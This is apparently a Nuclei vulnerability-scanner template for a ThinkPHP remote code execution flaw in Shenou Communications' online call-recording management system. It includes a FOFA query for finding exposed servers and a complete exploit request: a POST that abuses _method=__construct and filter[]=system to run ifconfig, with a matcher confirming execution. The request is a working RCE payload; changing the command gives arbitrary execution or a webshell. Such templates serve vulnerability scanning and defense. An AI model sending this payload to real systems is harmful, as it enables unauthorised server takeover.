id: shenoutongxin-Thinkphp-RCE

info:
  name: 申瓯通信在线录音管理系统存在Thinkphp 远程代码执行漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: title="在线录音管理系统"
    申瓯通信在线录音管理系统存在Thinkphp远程代码执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意指令或写入webshell，导致服务器权限被控，造成严重威胁。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139881024
  tags: RCE

http:
  - raw:
      - |
        POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        s=ifconfig&_method=__construct&method=POST&filter[]=system

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'eth0:'
      - type: status
        status: 
          - 302





